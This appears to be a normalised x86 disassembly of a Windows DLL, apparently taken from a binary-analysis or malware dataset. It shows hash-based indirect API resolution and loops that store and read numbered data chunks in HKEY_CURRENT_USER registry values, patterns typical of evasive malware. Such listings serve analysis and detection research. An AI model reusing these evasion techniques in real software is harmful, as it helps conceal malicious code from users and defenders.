jmp r-xdata
xor eax eax
call [ GetProcessHeap@IAT ]
and [ ebp - 0x8 ] 0x0
lea ecx [ edi + 0x2 ]
push ecx
push 0x8
push eax
mov [ ebp - 0x4 ] eax
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
je r-xdata
pop edi
pop ebx
leave
retn 0x4
and [ ebp - 0xc ] 0x0
push 0x3
push r--data
push ebx
call sub_10010621
add esp 0xc
test eax eax
jne r-xdata
push edi
push ebx
push esi
call sub_10010ab0
add esp 0xc
lea eax [ ebp - 0x8 ]
push eax
push esi
push [ ebp - 0xc ]
call sub_1000256f
xor ebx ebx
push esi
push ebx
push [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
cmp eax ebx
jne r-xdata
add edi 0xfffffffa
mov [ ebp - 0xc ] 0x1
add ebx 0x6
mov esi [ HeapFree@IAT ]
call esi
call sub_100033fe
mov edi eax
cmp edi ebx
jne r-xdata
call [ HeapFree@IAT ]
jmp r-xdata
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
push edi
call sub_100029d9
test eax eax
jne r-xdata
push [ ebp - 0x8 ]
jmp r-xdata
push edi
call sub_10002ade
push [ ebp + 0x8 ]
push 0x1010
push eax
push edi
call sub_10003f6c
test eax eax
jne r-xdata
push [ ebp - 0x8 ]
push ebx
push [ ebp - 0x4 ]
call esi
push edi
push ebx
push [ ebp - 0x4 ]
call esi
mov [ ebp + 0x8 ] 0x1
jmp r-xdata
mov [ ebp + 0x8 ] ebx
push [ ebp - 0x8 ]
push ebx
push [ ebp - 0x4 ]
call esi
push edi
push ebx
push [ ebp - 0x4 ]
call esi
mov eax [ ebp + 0x8 ]
jmp r-xdata
pop esi
sub_100036d3
push ebp
lea ebp [ esp - 0x6b0 ]
sub esp 0x730
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x6ac ] eax
mov eax [ ebp + 0x6b8 ]
and [ ebp - 0x74 ] 0x0
push ebx
push esi
push edi
mov ebx 0x104
push ebx
push 0x0
mov [ ebp - 0x78 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x3
mov edi 0x9af9fa4b
push edi
mov esi r--data
push esi
call sub_10001347
push ebx
push 0x0
lea eax [ ebp + 0x29c ]
push eax
push 0x3
push edi
push esi
call sub_10001347
mov edx [ ebp - 0x78 ]
mov eax [ edx ]
add esp 0x30
mov [ ebp - 0x74 ] eax
push 0x4
lea eax [ ebp - 0x74 ]
push eax
call sub_10002b18
push [ ebp - 0x74 ]
add edx 0x4
push edx
lea eax [ ebp - 0x70 ]
push eax
call sub_10010ab0
mov eax [ ebp - 0x74 ]
mov ecx [ ebp - 0x78 ]
lea edx [ ecx + eax + 0x4 ]
mov [ ebp - 0x80 ] eax
mov eax [ edx ]
add esp 0xc
mov [ ebp - 0x74 ] eax
push 0x4
lea eax [ ebp - 0x74 ]
push eax
call sub_10002b18
push [ ebp - 0x74 ]
add edx 0x4
push edx
lea eax [ ebp + 0x29c ]
push eax
call sub_10010ab0
mov eax [ ebp - 0x74 ]
add esp 0xc
and [ ebp - 0x78 ] 0x0
mov [ ebp - 0x7c ] eax
push 0x1
lea eax [ ebp + 0x4a4 ]
push eax
push r--data
push 0x80000001
push [ ebp - 0x80 ]
lea eax [ ebp - 0x70 ]
push eax
call sub_10001e34
test eax eax
jne r-xdata
inc [ ebp - 0x78 ]
cmp [ ebp - 0x78 ] 0xa
jl r-xdata
push ebx
push 0x0
lea eax [ ebp + 0x4a4 ]
push eax
push 0x3
push edi
push esi
call sub_10001347
push [ ebp - 0x78 ]
xor eax eax
jmp r-xdata
push ebx
push 0x0
lea eax [ ebp + 0x198 ]
push eax
push 0x3
push edi
push esi
call sub_10001347
push ebx
push 0x0
lea eax [ ebp + 0x4a4 ]
push eax
push 0x3
push edi
push esi
call sub_10001347
push [ ebp - 0x78 ]
lea eax [ ebp + 0x4a4 ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0x3c
lea eax [ ebp + 0x4a4 ]
push eax
push r--data
push 0x80000001
lea eax [ ebp - 0x74 ]
push eax
lea eax [ ebp + 0x198 ]
push eax
call sub_10001edd
test eax eax
je r-xdata
push ebx
push 0x0
lea eax [ ebp + 0x4a4 ]
push eax
push 0x3
push edi
push esi
call sub_10001347
push 0x9
lea eax [ ebp + 0x4a4 ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0x24
lea eax [ ebp + 0x4a4 ]
push eax
call sub_10001f52
test eax eax
je r-xdata
xor eax eax
inc eax
mov ecx [ ebp + 0x6ac ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000fe6e
add ebp 0x6b0
leave
retn 0x4
push 0x1
lea eax [ ebp + 0x4a4 ]
push eax
push r--data
push 0x80000001
push [ ebp - 0x80 ]
lea eax [ ebp - 0x70 ]
push eax
call sub_10001e34
test eax eax
je r-xdata
push ebx
push 0x0
lea eax [ ebp + 0x4a4 ]
push eax
push 0x3
push edi
push esi
call sub_10001347
push 0x9
jmp r-xdata
lea eax [ ebp + 0x4a4 ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0x24
push 0x1
lea eax [ ebp + 0x4a4 ]
push eax
push r--data
push 0x80000001
push [ ebp - 0x7c ]
lea eax [ ebp + 0x29c ]
push eax
call sub_10001e34
test eax eax
je r-xdata
sub_1000390b
push ebp
lea ebp [ esp - 0x198 ]
sub esp 0x218
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x194 ] eax
mov eax [ ebp + 0x1a0 ]
and [ ebp - 0x78 ] 0x0
push ebx
push esi
push edi
mov edi [ wsprintfW@IAT ]
mov [ ebp - 0x80 ] eax
mov ebx r--data
push 0x104
push 0x0
lea eax [ ebp - 0x74 ]
push eax
push 0x3
mov esi 0x9af9fa4b
push esi
push ebx
call sub_10001347
push [ ebp - 0x78 ]
lea eax [ ebp - 0x74 ]
push r--data
push eax
call edi
add esp 0x24
lea eax [ ebp - 0x74 ]
push eax
call sub_10001f52
push 0x104
push 0x0
lea eax [ ebp - 0x74 ]
push eax
push 0x3
push esi
push ebx
call sub_10001347
push [ ebp - 0x78 ]
lea eax [ ebp - 0x74 ]
push r--data
push eax
call edi
add esp 0x24
lea eax [ ebp - 0x74 ]
push eax
call sub_10001f52
inc [ ebp - 0x78 ]
cmp [ ebp - 0x78 ] 0xa
jl r-xdata
xor esi esi
and [ ebp - 0x7c ] esi
cmp [ ebp + 0x1a4 ] esi
jbe r-xdata
xor eax eax
inc eax
cmp [ ebp - 0x7c ] 0xa
jae r-xdata
mov eax [ ebp - 0x80 ]
mov eax [ eax + esi ]
mov [ ebp - 0x78 ] eax
push 0x4
lea eax [ ebp - 0x78 ]
push eax
call sub_10002b18
push 0x104
push 0x0
lea eax [ ebp - 0x74 ]
push eax
push 0x3
push 0x9af9fa4b
push ebx
call sub_10001347
push [ ebp - 0x7c ]
lea eax [ ebp - 0x74 ]
push r--data
push eax
call edi
add esp 0x24
push 0x1
lea eax [ ebp - 0x74 ]
push eax
mov eax [ ebp - 0x80 ]
push r--data
push 0x80000001
push [ ebp - 0x78 ]
add esi 0x4
add eax esi
push eax
call sub_10001e34
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
add esi [ ebp - 0x78 ]
cmp esi [ ebp + 0x1a4 ]
jae r-xdata
mov ecx [ ebp + 0x194 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000fe6e
add ebp 0x198
leave
retn 0x8
inc [ ebp - 0x7c ]
cmp esi [ ebp + 0x1a4 ]
jb r-xdata
mov eax [ ebp - 0x80 ]
mov eax [ eax + esi ]
mov [ ebp - 0x78 ] eax
push 0x4
lea eax [ ebp - 0x78 ]
push eax
call sub_10002b18
push 0x104
push 0x0
lea eax [ ebp - 0x74 ]
push eax
push 0x3
push 0x9af9fa4b
push ebx
call sub_10001347
push [ ebp - 0x7c ]
lea eax [ ebp - 0x74 ]
push r--data
push eax
call edi
add esp 0x24
push 0x1
lea eax [ ebp - 0x74 ]
push eax
mov eax [ ebp - 0x80 ]
push r--data
push 0x80000001
push [ ebp - 0x78 ]
add esi 0x4
add eax esi
push eax
call sub_10001e34
test eax eax
je r-xdata
add esi [ ebp - 0x78 ]
sub_10003acc
push ebp
lea ebp [ esp - 0x398 ]
sub esp 0x418
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x394 ] eax
push ebx
push esi
mov esi [ ebp + 0x3a0 ]
mov [ ebp - 0x74 ] esi
call [ GetProcessHeap@IAT ]
push [ esi + 0x4 ]
mov [ ebp - 0x7c ] eax
call sub_10002ade
mov ebx eax
xor esi esi
cmp ebx esi
jbe r-xdata
mov ecx [ ebp + 0x394 ]
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_1000fe6e
add ebp 0x398
leave
retn 0x4
push edi
call sub_100033fe
lea edi [ ebx + 0x400 ]
push edi
mov [ ebp - 0x70 ] eax
call sub_1000ff5a
push edi
push esi
push eax
push 0x3
push 0x9af9fa4b
push r--data
mov [ ebp - 0x78 ] eax
call sub_10001347
mov eax [ ebp - 0x74 ]
push esi
push esi
push ebx
push [ ebp - 0x78 ]
mov ebx 0x23fbbc3f
push 0xffffffff
push [ eax + 0x4 ]
mov edi r--data
push esi
push esi
push 0x8
push ebx
push edi
call sub_10001347
add esp 0x48
push [ ebp - 0x70 ]
call sub_10002ade
push 0x400
push esi
mov [ ebp - 0x80 ] eax
lea eax [ ebp - 0x6c ]
push eax
push 0x3
push 0x9af9fa4b
push r--data
call sub_10001347
push esi
push esi
push [ ebp - 0x80 ]
lea eax [ ebp - 0x6c ]
push eax
push 0xffffffff
push [ ebp - 0x70 ]
push esi
push esi
push 0x8
push ebx
push edi
call sub_10001347
mov ebx [ ebp - 0x78 ]
mov edi [ lstrcatA@IAT ]
add esp 0x44
push r--data
push ebx
call edi
lea eax [ ebp - 0x6c ]
push eax
push ebx
call edi
push ebx
call sub_10010541
pop ecx
pop edi
test eax eax
jne r-xdata
push [ ebp - 0x70 ]
push esi
push [ ebp - 0x7c ]
call [ HeapFree@IAT ]
push ebx
call sub_1000fe7d
pop ecx
lea eax [ ebp - 0x6c ]
push eax
call sub_10002b06
mov ecx [ ebp - 0x74 ]
push [ ecx ]
push 0x11
push eax
push [ ebp - 0x70 ]
call sub_10003f6c
sub_10003c0f
push esi
call [ GetProcessHeap@IAT ]
push 0x8
mov esi eax
call sub_100106c2
pop ecx
mov ecx [ esp + 0xc ]
mov [ rw-data ] eax
mov [ eax ] ecx
lea eax [ edi + 0x2 ]
push eax
push 0x8
push esi
call [ HeapAlloc@IAT ]
mov esi [ rw-data ]
push edi
push [ esp + 0xc ]
mov [ esi + 0x4 ] eax
push eax
call sub_10010ab0
add esp 0xc
push esi
push sub_10003acc
call sub_10002382
xor eax eax
inc eax
pop esi
retn 0x8
sub_10003c61
push ebp
mov ebp esp
sub esp 0x804
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
xor esi esi
push 0x400
push 0x0
lea eax [ ebp - 0x804 ]
push eax
push 0x3
push 0x9af9fa4b
push r--data
call sub_10001347
push esi
push edi
lea eax [ ebp - 0x804 ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0x28
lea eax [ ebp - 0x804 ]
push eax
call sub_10001f52
inc esi
cmp esi 0x64
jl r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_1000fe6e
leave
retn
sub_10003ccc
sub esp 0x10
push ebx
push esi
push edi
xor ebx ebx
push ebx
push ebx
push 0x3
push ebx
push 0x1
push 0x80000000
push [ esp + 0x38 ]
mov esi r--data
push 0x7
push 0x47763959
push esi
mov [ esp + 0x3c ] ebx
call sub_10001347
mov edi eax
add esp 0x28
cmp edi 0xffffffff
jne r-xdata
push ebp
lea eax [ esp + 0x18 ]
push eax
push edi
call [ GetFileSize@IAT ]
mov ebp eax
mov [ esp + 0x10 ] ebp
cmp ebp ebx
jbe r-xdata
xor eax eax
jmp r-xdata
push edi
push 0x1
push 0xed00c776
push esi
call sub_10001347
add esp 0x10
jmp r-xdata
call [ GetProcessHeap@IAT ]
inc ebp
push ebp
push 0x8
push eax
mov [ esp + 0x20 ] eax
call [ HeapAlloc@IAT ]
push ebx
mov ebp eax
lea eax [ esp + 0x1c ]
push eax
push [ esp + 0x18 ]
push ebp
push edi
push 0x5
push 0xdc85674c
push esi
call sub_10001347
add esp 0x20
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
add esp 0x10
retn 0x4
xor eax eax
jmp r-xdata
push edi
push 0x1
push 0xed00c776
push esi
call sub_10001347
add esp 0x10
push [ esp + 0x10 ]
push ebp
call sub_10005c24
push ebp
mov ebp [ HeapFree@IAT ]
push ebx
push [ esp + 0x1c ]
mov edi eax
mov [ esp + 0x28 ] edi
call ebp
cmp edi ebx
je r-xdata
push ebp
push ebx
push [ esp + 0x1c ]
call [ HeapFree@IAT ]
pop ebp
push [ esp + 0x24 ]
push 0x1
push 0x4856bd25
push esi
call sub_10001347
add esp 0x10
test eax eax
je r-xdata
push edi
call sub_10002b06
mov [ esp + 0x10 ] eax
cmp eax ebx
jbe r-xdata
push ebx
push 0x6
push 0x4
push ebx
push 0x2
push 0x40000000
push [ esp + 0x3c ]
push 0x7
push 0x47763959
push esi
call sub_10001347
mov edi eax
add esp 0x28
cmp edi 0xffffffff
je r-xdata
push ebx
lea eax [ esp + 0x1c ]
push eax
push [ esp + 0x18 ]
push [ esp + 0x28 ]
push edi
push 0x5
push 0x76a474f
push esi
call sub_10001347
add esp 0x20
push [ esp + 0x1c ]
push ebx
push [ esp + 0x1c ]
test eax eax
jne r-xdata
call ebp
lea eax [ esp + 0x18 ]
push eax
push edi
call [ GetFileSize@IAT ]
push edi
push 0x1
push 0xed00c776
push esi
mov ebx eax
call sub_10001347
add esp 0x10
mov eax ebx
call ebp
sub_10003e5b
push ebp
lea ebp [ esp - 0xb98 ]
sub esp 0xc18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0xb94 ] eax
and [ ebp - 0x80 ] 0x0
and [ ebp - 0x70 ] 0x0
push esi
push edi
mov edi 0x9af9fa4b
mov esi r--data
inc [ ebp - 0x70 ]
cmp [ ebp - 0x70 ] 0x64
jl r-xdata
mov eax [ ebp - 0x74 ]
cmp [ ebp + 0xba4 ] eax
jne r-xdata
and [ ebp - 0x7c ] 0x0
push 0x400
push 0x0
lea eax [ ebp + 0x794 ]
push eax
push 0x3
push edi
push esi
mov [ ebp - 0x74 ] 0x400
call sub_10001347
push [ ebp - 0x74 ]
lea eax [ ebp - 0x6c ]
push 0x0
push eax
push 0x3
push edi
push esi
call sub_10001347
push [ ebp - 0x70 ]
lea eax [ ebp - 0x6c ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0x3c
lea eax [ ebp - 0x6c ]
push eax
push r--data
push 0x80000001
lea eax [ ebp - 0x74 ]
push eax
lea eax [ ebp + 0x794 ]
push eax
call sub_10001edd
test eax eax
je r-xdata
jmp r-xdata
cmp eax [ ebp - 0x7c ]
je r-xdata
and [ ebp - 0x78 ] 0x0
test eax eax
jbe r-xdata
mov ecx [ ebp + 0xb94 ]
mov eax [ ebp - 0x80 ]
pop edi
xor ecx ebp
pop esi
call sub_1000fe6e
add ebp 0xb98
leave
retn 0x8
mov [ ebp - 0x80 ] 0x1
mov ecx [ ebp + 0xba0 ]
lea eax [ ebp + 0x794 ]
sub ecx eax
inc [ ebp - 0x78 ]
mov eax [ ebp - 0x74 ]
cmp [ ebp - 0x78 ] eax
jb r-xdata
inc [ ebp - 0x7c ]
mov eax [ ebp - 0x78 ]
lea eax [ ebp + eax + 0x794 ]
mov dl [ eax ]
cmp dl [ ecx + eax ]
jne r-xdata
sub_10003f6c
push ebp
lea ebp [ esp - 0xb98 ]
sub esp 0xc18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0xb94 ] eax
mov eax [ ebp + 0xba0 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xba4 ]
mov [ ebp - 0x70 ] eax
call [ GetProcessHeap@IAT ]
lea ebx [ edi + 0xc ]
push ebx
push 0x8
push eax
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x80 ] ebx
call [ HeapAlloc@IAT ]
mov esi eax
mov eax [ ebp + 0xba8 ]
mov [ esi ] eax
mov eax [ ebp + 0xbac ]
push edi
push [ ebp - 0x70 ]
mov [ esi + 0x4 ] eax
lea eax [ esi + 0xc ]
push eax
mov [ ebp - 0x78 ] esi
mov [ esi + 0x8 ] edi
call sub_10010ab0
add esp 0xc
push ebx
push esi
call sub_10002b18
push ebx
push esi
call sub_10003e5b
test eax eax
je r-xdata
test [ ebp + 0xba8 ] 0x10
je r-xdata
push [ ebp - 0x74 ]
call [ HeapDestroy@IAT ]
and [ ebp - 0x70 ] 0x0
mov ebx 0x400
mov edi 0x9af9fa4b
mov esi r--data
test [ ebp + 0xba8 ] 0x1
je r-xdata
push 0x3
lea eax [ ebp + 0x394 ]
push eax
push r--data
push 0x80000001
push [ ebp - 0x80 ]
push [ ebp - 0x78 ]
call sub_10001e34
test eax eax
jne r-xdata
inc [ ebp - 0x70 ]
cmp [ ebp - 0x70 ] 0x64
jl r-xdata
push [ ebp - 0x70 ]
call sub_10003ccc
test eax eax
jne r-xdata
xor esi esi
inc esi
jmp r-xdata
push [ ebp - 0x78 ]
jmp r-xdata
push ebx
push 0x0
lea eax [ ebp - 0x6c ]
push eax
push 0x3
push edi
push esi
mov [ ebp - 0x7c ] ebx
call sub_10001347
push [ ebp - 0x7c ]
lea eax [ ebp + 0x394 ]
push 0x0
push eax
push 0x3
push edi
push esi
call sub_10001347
push [ ebp - 0x70 ]
lea eax [ ebp + 0x394 ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0x3c
lea eax [ ebp + 0x394 ]
push eax
push r--data
push 0x80000001
lea eax [ ebp - 0x7c ]
push eax
lea eax [ ebp - 0x6c ]
push eax
call sub_10001edd
test eax eax
je r-xdata
push ebx
push 0x0
lea eax [ ebp - 0x6c ]
push eax
push 0x3
push edi
push esi
mov [ ebp - 0x7c ] ebx
call sub_10001347
push [ ebp - 0x7c ]
lea eax [ ebp + 0x394 ]
push 0x0
push eax
push 0x3
push edi
push esi
call sub_10001347
push r--data
lea eax [ ebp + 0x394 ]
push eax
push 0x2
push 0x825884e9
push r--data
call sub_10001347
add esp 0x44
push 0x3
lea eax [ ebp + 0x394 ]
push eax
push r--data
push 0x80000001
push [ ebp - 0x80 ]
push [ ebp - 0x78 ]
call sub_10001e34
test eax eax
jne r-xdata
push esi
push [ ebp - 0x78 ]
push 0x0
push [ ebp - 0x74 ]
call [ HeapFree@IAT ]
mov eax esi
jmp r-xdata
push 0x0
push [ ebp - 0x74 ]
call [ HeapFree@IAT ]
jmp r-xdata
xor esi esi
xor eax eax
mov ecx [ ebp + 0xb94 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000fe6e
add ebp 0xb98
leave
retn 0x10
sub_10004170
push ebp
lea ebp [ esp - 0x790 ]
sub esp 0x810
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x78c ] eax
mov eax [ ebp + 0x798 ]
or [ ebp - 0x80 ] 0xffffffff
and [ ebp - 0x78 ] 0x0
push esi
push edi
mov [ ebp - 0x7c ] eax
mov edi 0x9af9fa4b
mov esi r--data
mov eax [ ebp - 0x78 ]
inc [ ebp - 0x78 ]
cmp [ ebp - 0x78 ] 0x64
jl r-xdata
push 0x400
push 0x0
lea eax [ ebp - 0x74 ]
push eax
push 0x3
push edi
push esi
call sub_10001347
push [ ebx ]
push 0x0
push [ ebp - 0x7c ]
push 0x3
push edi
push esi
call sub_10001347
push [ ebp - 0x78 ]
lea eax [ ebp - 0x74 ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0x3c
lea eax [ ebp - 0x74 ]
push eax
push r--data
push 0x80000001
push ebx
push [ ebp - 0x7c ]
call sub_10001edd
test eax eax
jne r-xdata
mov eax [ ebp - 0x80 ]
jmp r-xdata
mov ecx [ ebp + 0x78c ]
pop edi
xor ecx ebp
pop esi
call sub_1000fe6e
add ebp 0x790
leave
retn 0x4
sub_10004226
push ebx
push esi
push edi
call [ GetProcessHeap@IAT ]
push 0x400
mov edi eax
push 0x8
push edi
xor ebx ebx
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn 0x4
push [ esp + 0x10 ]
push r--data
push esi
call [ wsprintfW@IAT ]
add esp 0xc
push esi
call sub_10001f52
test eax eax
je r-xdata
push esi
push 0x0
push edi
call [ HeapFree@IAT ]
mov eax ebx
xor ebx ebx
inc ebx
sub_10004279
push ebp
mov ebp esp
sub esp 0x804
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ esi ] 0x0
push ebx
push edi
call [ GetProcessHeap@IAT ]
mov ebx eax
mov eax 0x1388
push eax
push 0x8
push ebx
mov [ esi ] eax
call [ HeapAlloc@IAT ]
push 0x400
push 0x0
mov edi eax
lea eax [ ebp - 0x804 ]
push eax
push 0x3
push 0x9af9fa4b
push r--data
call sub_10001347
push [ ebp + 0x8 ]
lea eax [ ebp - 0x804 ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0x24
lea eax [ ebp - 0x804 ]
push eax
push r--data
push 0x80000001
push esi
push edi
call sub_10001edd
test eax eax
jne r-xdata
mov eax edi
push edi
push eax
push ebx
call [ HeapFree@IAT ]
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_1000fe6e
leave
retn 0x4
sub_1000431e
push ebp
lea ebp [ esp - 0x2ac ]
sub esp 0x32c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x2a8 ] eax
mov eax [ ebp + 0x2b8 ]
push ebx
mov [ ebp - 0x74 ] eax
mov eax [ ebp + 0x2c0 ]
push esi
mov [ ebp - 0x7c ] eax
xor eax eax
push edi
mov [ ebp - 0x80 ] 0x400
mov [ ebp - 0x78 ] eax
mov [ ebp - 0x6c ] eax
mov [ ebp - 0x70 ] eax
mov ebx 0x104
mov edi 0x9af9fa4b
mov esi r--data
mov eax [ ebp + 0x2b4 ]
inc eax
mov [ ebp - 0x68 ] eax
cmp eax [ ebp - 0x6c ]
ja r-xdata
mov eax [ ebp - 0x68 ]
inc [ ebp - 0x68 ]
cmp [ ebp - 0x68 ] 0xa
mov [ ebp - 0x6c ] eax
jl r-xdata
and [ ebp - 0x68 ] 0x0
test eax eax
jge r-xdata
push ebx
push 0x0
lea eax [ ebp - 0x64 ]
push eax
push 0x3
push edi
push esi
call sub_10001347
push ebx
push 0x0
lea eax [ ebp + 0xa0 ]
push eax
push 0x3
push edi
push esi
call sub_10001347
push [ ebp - 0x68 ]
lea eax [ ebp + 0xa0 ]
push r--data
push eax
call [ wsprintfW@IAT ]
mov eax [ ebp + 0x2bc ]
add esp 0x3c
mov [ ebp - 0x78 ] eax
lea eax [ ebp + 0xa0 ]
push eax
push r--data
push 0x80000001
lea eax [ ebp - 0x78 ]
push eax
lea eax [ ebp - 0x64 ]
push eax
call sub_10001edd
test eax eax
je r-xdata
inc [ ebp - 0x70 ]
cmp [ ebp - 0x70 ] 0xa
jl r-xdata
push ebx
push 0x0
lea eax [ ebp + 0xa0 ]
push eax
push 0x3
push edi
push esi
call sub_10001347
push [ ebp - 0x68 ]
lea eax [ ebp + 0xa0 ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0x24
lea eax [ ebp + 0xa0 ]
push eax
push r--data
push 0x80000001
lea eax [ ebp - 0x80 ]
push eax
push [ ebp - 0x7c ]
call sub_10001edd
test eax eax
je r-xdata
push [ ebp - 0x6c ]
push [ ebp - 0x74 ]
call sub_10002b18
push ebx
push 0x0
lea eax [ ebp + 0xa0 ]
push eax
push 0x3
push edi
push esi
call sub_10001347
push [ ebp - 0x68 ]
lea eax [ ebp + 0xa0 ]
push r--data
push eax
call [ wsprintfW@IAT ]
mov eax [ ebp + 0x2bc ]
add esp 0x24
mov [ ebp - 0x6c ] eax
lea eax [ ebp + 0xa0 ]
push eax
push r--data
push 0x80000001
lea eax [ ebp - 0x6c ]
push eax
push [ ebp - 0x74 ]
call sub_10001edd
test eax eax
je r-xdata
and [ ebp - 0x68 ] 0x0
or eax 0xffffffff
mov eax [ ebp - 0x68 ]
jmp r-xdata
push [ ebp - 0x80 ]
push [ ebp - 0x7c ]
call sub_10002b18
mov ecx [ ebp + 0x2a8 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000fe6e
add ebp 0x2ac
leave
retn 0x10
sub_100044e8
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
mov edi eax
xor ebx ebx
mov [ edi ] ebx
call [ GetProcessHeap@IAT ]
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
lea esi [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
call sub_10004279
mov esi eax
mov [ ebp + 0xc ] esi
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x8 ] ebx
jbe r-xdata
push [ ebp - 0x8 ]
push esi
call sub_10002b18
mov ecx [ esi ]
mov eax [ esi + 0x8 ]
mov [ ebp - 0x14 ] eax
test ecx 0x1000
je r-xdata
mov edi [ HeapFree@IAT ]
test cl 0x10
je r-xdata
mov [ edi ] 0x1
test ecx 0x100
je r-xdata
add eax 0x2
push eax
push 0x8
push [ ebp - 0x4 ]
call [ HeapAlloc@IAT ]
push [ ebp - 0x14 ]
mov ecx [ ebp + 0x10 ]
lea ebx [ esi + 0xc ]
push ebx
push eax
mov [ ecx ] eax
call sub_10010ab0
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x1
push 0x80000000
push ebx
push 0x7
push 0x47763959
mov ebx r--data
push ebx
call sub_10001347
add esp 0x34
mov [ ebp - 0xc ] eax
cmp eax 0xffffffff
jne r-xdata
push esi
push 0x0
push [ ebp - 0x4 ]
call edi
push [ ebp - 0xc ]
push ebx
call sub_10005c24
mov esi eax
test esi esi
jne r-xdata
and [ ebp + 0x10 ] ebx
push esi
mov esi [ ebp - 0x8 ]
lea ebx [ ebp + 0x10 ]
call sub_1000101d
mov esi eax
test esi esi
je r-xdata
and [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call [ GetFileSize@IAT ]
mov esi eax
test esi esi
ja r-xdata
push esi
push 0x0
push [ ebp - 0x4 ]
call edi
push esi
call sub_10002b06
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
jmp r-xdata
push ebx
push 0x0
push [ ebp - 0x4 ]
call edi
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
push [ ebp + 0xc ]
push 0x0
push [ ebp - 0x4 ]
call edi
mov eax [ ebp + 0x10 ]
mov [ ebp + 0xc ] esi
mov [ ebp - 0x8 ] eax
jmp r-xdata
lea eax [ esi + 0x1 ]
push eax
push 0x8
push [ ebp - 0x4 ]
call [ HeapAlloc@IAT ]
push 0x0
lea ecx [ ebp - 0x10 ]
push ecx
push esi
push eax
push [ ebp - 0xc ]
mov [ ebp + 0x10 ] eax
push 0x5
push 0xdc85674c
push ebx
call sub_10001347
add esp 0x20
test eax eax
jne r-xdata
push [ ebp + 0xc ]
push 0x0
push [ ebp - 0x4 ]
call [ HeapFree@IAT ]
pop edi
pop esi
pop ebx
leave
retn 0xc
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
push ebx
call sub_10010ab0
add esp 0xc
push [ ebp + 0xc ]
push eax
push [ ebp - 0x4 ]
call edi
jmp r-xdata
push eax
push 0x8
push [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
call [ HeapAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
push [ ebp - 0xc ]
push 0x1
push 0xed00c776
push ebx
call sub_10001347
and [ ebp - 0xc ] 0x0
add esp 0x10
push [ ebp + 0x10 ]
lea ebx [ ebp - 0xc ]
call sub_1000101d
mov ebx eax
test ebx ebx
je r-xdata
push [ ebp + 0xc ]
mov esi [ HeapFree@IAT ]
push eax
push [ ebp - 0x4 ]
call esi
push [ ebp + 0x10 ]
push 0x0
push [ ebp - 0x4 ]
call esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
lea eax [ esi + eax + 0x5 ]
push eax
push 0x8
push [ ebp - 0x4 ]
call [ HeapAlloc@IAT ]
push [ ebp - 0x8 ]
mov ebx eax
push [ ebp + 0xc ]
push ebx
call sub_10010ab0
mov eax [ ebp - 0x8 ]
mov [ eax + ebx ] esi
mov eax [ ebp - 0x8 ]
push esi
push [ ebp + 0x10 ]
lea eax [ eax + ebx + 0x4 ]
push eax
call sub_10010ab0
add esp 0x18
push [ ebp + 0x10 ]
push 0x0
push [ ebp - 0x4 ]
call edi
mov eax [ ebp - 0x8 ]
lea eax [ esi + eax + 0x4 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
push [ ebp + 0x10 ]
push 0x0
push [ ebp - 0x4 ]
call edi
mov esi [ ebp - 0xc ]
mov [ ebp + 0x10 ] ebx
push [ ebp - 0xc ]
push 0x1
push 0xed00c776
push ebx
call sub_10001347
add esp 0x10
jmp r-xdata
mov esi [ ebp + 0xc ]
sub_10004762
sub esp 0x14
and [ esp + 0xc ] 0x0
push ebp
push esi
push edi
call [ GetProcessHeap@IAT ]
mov esi [ esp + 0x28 ]
mov edi eax
lea eax [ esi + 0x2 ]
push eax
push 0x8
push edi
mov [ esp + 0x20 ] edi
mov [ esp + 0x28 ] eax
call [ HeapAlloc@IAT ]
mov ebp eax
mov [ esp + 0x10 ] ebp
test ebp ebp
jne r-xdata
